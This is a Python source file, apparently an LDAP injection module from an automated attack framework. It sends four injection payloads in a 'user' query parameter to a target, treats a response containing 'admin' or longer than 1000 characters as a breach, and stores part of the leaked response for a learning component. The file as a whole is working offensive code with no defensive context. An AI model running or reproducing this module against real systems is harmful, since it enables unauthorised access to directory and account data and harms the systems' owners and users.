# src/attacks/ldap_injection.py — v15.4
import asyncio
import httpx
from typing import Dict, Any
from src.core.logger import RealTimeLogger

class LDAPInjectionModule:
    def __init__(self, logger: RealTimeLogger, brain=None, config: Dict = None):
        self.logger = logger
        self.brain = brain
        self.config = config or {}

    async def attack(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        result = {"attack": "ldap_injection", "success": False, "risk": 9}

        request = options.get('request')
        if not request:
            return result

        payloads = [
            "*)(uid=*))(|(uid=*",
            "admin*",
            "*)(objectclass=*",
            "admin*)((|",
        ]

        self.logger.info(f"LDAP INJECTION → {target}")

        for payload in payloads:
            try:
                resp = await request('GET', target, params={"user": payload})
                if resp and ("admin" in resp.text.lower() or len(resp.text) > 1000):
                    result.update({
                        "success": True,
                        "vulnerable_payload": payload,
                        "data_leaked": {"response": resp.text[:500]}
                    })
                    self.logger.breach(f"LDAP INJECTION: {payload}")
                    if self.brain:
                        self.brain.learn("ldap_injection", target, payload, True, resp.text[:300])
                    break
            except:
                continue

        return result